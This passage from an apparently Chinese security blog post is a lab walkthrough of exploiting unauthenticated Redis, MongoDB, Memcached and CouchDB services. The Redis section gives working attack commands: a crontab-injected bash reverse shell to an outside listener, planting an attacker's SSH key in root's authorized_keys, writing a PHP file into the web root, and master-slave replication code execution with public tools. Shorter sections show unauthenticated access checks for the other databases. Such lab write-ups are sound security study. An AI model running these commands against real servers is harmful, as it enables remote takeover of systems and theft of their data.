<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">下载：wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-4.0.9.tar.gz</span><br><span class="line">解压：tar -zxvf redis-4.0.9.tar.gz</span><br><span class="line">cd redis-4.0.9</span><br><span class="line">make</span><br><span class="line">make test</span><br><span class="line">make install</span><br><span class="line">依次执行</span><br><span class="line"></span><br><span class="line">配置redis.conf</span><br><span class="line">注释 bind 127.0.0.1</span><br><span class="line">关闭保护模式，将protected-mode yes改为no</span><br></pre></td></tr></table></figure>

<p>未授权连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-cli -h 0.0.0.0 -p 6379 连接上靶机</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo0hlawcxj315w0pk775.jpg" alt="image-20200712110823533"></p>
<h5 id="crontab-计划任务"><a href="#crontab-计划任务" class="headerlink" title="crontab-计划任务"></a>crontab-计划任务</h5><p>本机监听</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo0ji6dacj30ro07wjrn.jpg" alt="image-20200712111013635"></p>
<p>redis</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set x &quot;\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.239.136&#x2F;8888 0&gt;&amp;1\n&quot;</span><br><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo0ils1rhj323s0g8gtz.jpg" alt="image-20200712110920900"></p>
<p>接收到反弹shell</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo0u4fj3hj30w40u0tfb.jpg" alt="image-20200712112025614"></p>
<h5 id="ssh-keygen"><a href="#ssh-keygen" class="headerlink" title="ssh-keygen"></a>ssh-keygen</h5><p>本地生成秘钥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd .ssh</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; foo.txt</span><br><span class="line">cat foo.txt | redis-cli -h  192.168.239.129 -x set crackit</span><br></pre></td></tr></table></figure>

<p>redis</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-cli -h  192.168.239.129</span><br><span class="line">config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">config get dir</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">最后本机运行</span><br><span class="line">ssh -i id_rsa root@x.x.x.x</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo0dm7g43j32740sun4e.jpg" alt="image-20200712110433966"></p>
<h5 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-cli -h  192.168.239.129</span><br><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set x &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo18p96skj30ue092jsd.jpg" alt="image-20200712113426626"></p>
<p>写入成功</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo192t9zxj31m60u079y.jpg" alt="image-20200712113446908"></p>
<h5 id="利用主从复制RCE"><a href="#利用主从复制RCE" class="headerlink" title="利用主从复制RCE"></a>利用主从复制RCE</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">so文件：git clone https:&#x2F;&#x2F;github.com&#x2F;n0b0dyCN&#x2F;RedisModules-ExecuteCommand(下载后进入目录make，获取恶意so文件)</span><br><span class="line">python脚本：git clone https:&#x2F;&#x2F;github.com&#x2F;Ridter&#x2F;redis-rce.git</span><br><span class="line"></span><br><span class="line">执行命令：python3 redis-rce.py -r 192.168.239.129 -p 6379 -L 192.168.239.136 -f module.so</span><br></pre></td></tr></table></figure>

<p>成功获取shell</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo2c4z28qj31780u07b9.jpg" alt="image-20200712121220182"></p>
<h4 id="MongoDB未授权访问"><a href="#MongoDB未授权访问" class="headerlink" title="MongoDB未授权访问"></a>MongoDB未授权访问</h4><p>目标机：ubuntu</p>
<p>攻击机：kali</p>
<p>使用docker搭建漏洞环境</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">拉取环境</span><br><span class="line">	sudo docker pull mongo</span><br><span class="line">查看镜像</span><br><span class="line">	sudo docker images</span><br><span class="line">启动容器</span><br><span class="line">	sudo docker run -d -p 27017:27017 --name mongodb mongo</span><br><span class="line">查看mongodb容器IP</span><br><span class="line">	sudo $docker inspect mongodb | grep IPAddress</span><br><span class="line">映射docker mongodb 27917端口到本机27917端口上</span><br><span class="line">	sudo iptables -t nat -A DOCKER -p tcp --dport 27917 -j DNAT --to-destination 172.17.0.2:27017</span><br></pre></td></tr></table></figure>

<p>nmap扫描</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggqxb3t0dfj31100aw75k.jpg" alt="image-20200714233501502"></p>
<p>至此，漏洞环境搭建成功</p>
<p>使用metasploit扫描漏洞是否存在</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">扫描模块</span><br><span class="line">	auxiliary&#x2F;scanner&#x2F;mongodb&#x2F;mongodb_login</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggqxx5fpgqj31v00jk451.jpg" alt="image-20200714235614189"></p>
<p>使用Mongodb连接工具</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">下载地址：https:&#x2F;&#x2F;nosqlbooster.com&#x2F;downloads</span><br></pre></td></tr></table></figure>

<p>输入靶机IP，连接即可</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggqyew6oyvj314y0oatcu.jpg" alt="image-20200715001317487"></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggqyee7jevj31bo0u07hm.jpg" alt="image-20200715001247581"></p>
<p>连接成功</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggqyg2p0zgj31e00u0qay.jpg" alt="image-20200715001424500"></p>
<h4 id="Memcached未授权访问"><a href="#Memcached未授权访问" class="headerlink" title="Memcached未授权访问"></a>Memcached未授权访问</h4><p>目标机:Centos7</p>
<p>环境搭建</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安装：</span><br><span class="line">	sudo yum install memcached</span><br><span class="line">启动服务</span><br><span class="line">	sudo memcached -d -m 128 -p 11211 -u root</span><br><span class="line">查看是否启动服务</span><br><span class="line">	sudo ps -ef | grep memcache</span><br><span class="line">安装客户端</span><br><span class="line">	sudo yum install php-memcached</span><br><span class="line">重启apache服务</span><br><span class="line">	service apache2 restart</span><br><span class="line">查看端口开放</span><br><span class="line">	netstat -an |more</span><br></pre></td></tr></table></figure>

<p>当显示如下图，漏洞环境搭建成功</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggs2g3lpqbj31420m4tas.jpg" alt="image-20200715231820276"></p>
<p>漏洞利用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">telnet 192.168.239.137 11211</span><br></pre></td></tr></table></figure>

<p>成功</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggs2i2rhykj31420iamya.jpg" alt="image-20200715232019503"></p>
<h4 id="CouchDB未授权访问"><a href="#CouchDB未授权访问" class="headerlink" title="CouchDB未授权访问"></a>CouchDB未授权访问</h4><p>目标机：Kali</p>
<p>环境搭建</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;vulhub&#x2F;vulhub&#x2F;master&#x2F;couchdb&#x2F;CVE-2017-12636&#x2F;docker-compose.yml</span><br><span class="line"></span><br><span class="line">下载环境并启动</span><br><span class="line">	docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>如果访问不了网址,新建docker-compose.yml，将如下代码复制进去即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">version: &#39;2&#39;</span><br><span class="line">services:</span><br><span class="line">  couchdb:</span><br><span class="line">    image: vulhub&#x2F;couchdb:1.6.0 </span><br><span class="line">    ports:</span><br><span class="line">      - &quot;5984:5984&quot;</span><br></pre></td></tr></table></figure>

<p>环境搭建成功</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggt6qhomutj31qw0dm0u1.jpg" alt="image-20200716223216594"></p>
<p>漏洞利用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.239.129:5984&#x2F;_config				&#x2F;&#x2F;网址后面加上_config，出现如下图说明存在漏洞</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggt6r4c6f3j31if0u07bd.jpg" alt="image-20200716223254136"></p>
<h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>本文大概介绍了NoSQL注入的分类，主要讲的是MongoDB数据库注入，背负式和跨域违规，网上资料算是极少，只能从其他文章中摘录放到本文章内。</p>
<p>不管是SQL注入还是Nosql注入，漏洞产生原因都是未对用户输入的数据进行过滤或过滤不严谨，虽然NoSQL不使用SQL语句，但可根据程序语言来进行注入，不管是PHP，Node.JS或其他语言，没有做好数据过滤照样存在注入，果然世上没有绝对安全的应用，别问，问就是研究的不够深。</p>
<h3 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h3><p><a href="https://www.jianshu.com/p/25fb182ef52c" target="_blank" rel="noopener">https://www.jianshu.com/p/25fb182ef52c</a></p>
<p><a href="https://blog.csdn.net/qq_27446553/article/details/79379481?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-79379481.nonecase" target="_blank" rel="noopener">https://blog.csdn.net/qq_27446553/article/details/79379481?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-79379481.nonecase</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1602092" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1602092</a></p>
<p><a href="https://nullsweep.com/a-nosql-injection-primer-with-mongo/" target="_blank" rel="noopener">https://nullsweep.com/a-nosql-injection-primer-with-mongo/</a></p>
<p><a href="https://scotch.io/@401/mongodb-injection-in-nodejs" target="_blank" rel="noopener">https://scotch.io/@401/mongodb-injection-in-nodejs</a></p>
]]></content>
  </entry>
</search>
